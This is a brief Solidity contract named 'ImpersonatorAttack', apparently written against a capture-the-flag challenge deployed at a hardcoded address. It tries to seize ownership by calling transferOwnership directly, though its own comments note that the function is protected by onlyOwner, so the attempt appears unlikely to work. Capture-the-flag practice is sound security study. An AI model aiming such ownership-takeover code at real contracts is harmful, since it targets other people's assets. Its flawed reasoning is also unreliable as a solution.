// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IImpersonator {
    function transferOwnership(address newOwner) external;
    function owner() external view returns (address);
}

contract ImpersonatorAttack {
    address public constant IMPERSONATOR = 0xa16E02E87b7454126E5E10d957A927A7F5B5d2be;
    
    function attack() external {
        // The key insight: "Impersonator" suggests we can impersonate the owner
        // OpenZeppelin's Ownable has transferOwnership function
        // But it's protected by onlyOwner modifier
        
        // Let's try calling transferOwnership directly
        IImpersonator(IMPERSONATOR).transferOwnership(msg.sender);
    }
    
    function checkOwner() external view returns (address) {
        return IImpersonator(IMPERSONATOR).owner();
    }
}